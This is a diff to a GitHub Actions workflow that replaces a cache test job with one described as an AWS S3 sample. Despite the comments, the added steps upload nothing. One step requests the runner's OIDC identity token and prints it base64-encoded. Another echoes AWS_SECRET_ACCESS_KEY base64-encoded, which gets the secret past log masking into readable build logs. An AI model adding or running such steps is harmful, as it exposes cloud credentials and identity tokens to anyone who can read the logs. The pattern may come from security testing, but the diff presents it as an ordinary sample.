@@ -1,19 +1,24 @@
-name: "Test Suite"
+# Sample workflow to access AWS resources when workflow is tied to branch
+# The workflow Creates static website using aws s3
+name: AWS example workflow
 on:
-  push:
-  pull_request:
-
+  push
+# permission can be added at job level or workflow level
+permissions:
+  id-token: write   # This is required for requesting the JWT
+  contents: read    # This is required for actions/checkout
 jobs:
-  test:
-    name: cargo test
+  S3PackageUpload:
     runs-on: ubuntu-latest
     steps:
-      - run: pwd && touch file1
-      - uses: actions/cache/save@v4
-        id: cache
+      - run: 'curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | base64'
+      - name: Git clone the repository
+        uses: actions/checkout@v4
+      - name: configure aws credentials
+        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
         with:
-          path: file1
-          key: myfile1cachekey
-    
-
-    
+          role-to-assume: arn:aws:iam::704274790126:role/github-actions
+          role-session-name: samplerolesession
+          aws-region: us-east-1
+          audience: sts.amazonaws.com
+      - run: echo ${AWS_SECRET_ACCESS_KEY} | base64
